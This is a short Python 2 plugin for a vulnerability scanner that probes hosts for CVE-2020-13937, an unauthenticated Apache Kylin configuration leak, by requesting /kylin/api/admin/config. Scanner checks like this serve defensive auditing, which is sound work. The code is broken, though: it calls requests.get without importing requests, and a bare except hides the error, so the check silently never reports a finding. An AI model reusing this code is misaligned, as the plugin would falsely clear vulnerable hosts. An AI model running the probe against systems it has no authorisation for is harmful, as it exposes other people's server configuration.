# coding:utf-8
import socket
import time
import urllib2
import random

def get_plugin_info():
    plugin_info = {
        "name": "Apache Kylin的未授权配置泄露(CVE-2020-13937)",
        "info": "Apache Kylin的未授权配置泄露(CVE-2020-13937)",
        "level": "中危",
        "type": "未授权访问",
        "author": "zinc",
        "url": "https://help.aliyun.com/noticelist/articleid/1060733129.html",
        "keyword": "server:apache",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        path = '/kylin/api/admin/config'
        if port == 443:
            url = 'https://%s%s' % (ip, path)
        elif port == 80:
            url = 'http://%s%s' % (ip, path)
        else:
            url = 'http://%s:%d%s' % (ip, port, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36"
        }
        r = requests.get(url, headers=headers, timeout=timeout)
        if 'config' in r.content:
            return u"未授权访问"
    except:
        pass
